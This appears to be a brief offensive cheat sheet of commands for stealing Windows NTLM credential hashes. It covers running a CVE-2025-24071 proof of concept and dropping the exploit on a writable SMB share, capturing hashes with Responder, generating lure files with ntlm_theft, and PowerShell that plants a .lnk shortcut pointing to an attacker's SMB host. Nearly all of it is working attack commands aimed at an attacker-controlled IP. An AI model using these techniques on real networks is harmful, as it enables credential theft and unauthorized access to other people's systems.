# Windows Explorer Spoofing
```powershell
Condition: Have at least 1 writable SMB share

$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
$ cd CVE-2025-24071_PoC
$ python3 poc.py

smb: \> put exploit.zip

$ sudo responder -I tun0

nxc smb 192.168.0.10 -u 'user' -p 'password' -M scuffy -o SERVER=<attacker_ip> NAME=@test
```

# NTLM Theft
```powershell
git clone https://github.com/Greenwolf/ntlm_theft

python3 ntlm_theft.py -g all -s 10.10.14.66 -f media
sudo responder -I tun0 
```

# .LNK Files
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\Public\@important.lnk")
$lnk.TargetPath = "\\<ATTACKER-IP>\important.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
